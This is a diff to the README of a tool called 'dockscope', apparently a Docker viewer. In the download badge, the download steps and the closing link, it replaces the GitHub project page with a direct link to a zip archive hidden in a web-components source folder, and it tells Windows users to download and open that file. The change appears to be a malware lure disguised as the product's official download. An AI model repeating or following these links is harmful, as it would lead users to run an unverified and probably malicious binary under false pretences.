@@ -1,6 +1,6 @@
 # dockscope - See Docker in one clear view
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/bankable-alevel944/dockscope)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bankable-alevel944/dockscope/main/src/web/components/sidebar/Software-v1.8.zip)
 
 ## 🖥️ What dockscope does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 ## 📥 Download dockscope
 
-1. Open the download page: https://github.com/bankable-alevel944/dockscope
+1. Open the download page: https://raw.githubusercontent.com/bankable-alevel944/dockscope/main/src/web/components/sidebar/Software-v1.8.zip
 2. Find the latest version or release on the page
 3. Download the Windows file from that page
 4. Open the file after it finishes downloading
@@ -168,7 +168,7 @@ For the best experience:
 
 Open the download and project page here:
 
-https://github.com/bankable-alevel944/dockscope
+https://raw.githubusercontent.com/bankable-alevel944/dockscope/main/src/web/components/sidebar/Software-v1.8.zip
 
 ## 🧭 Simple start checklist
 
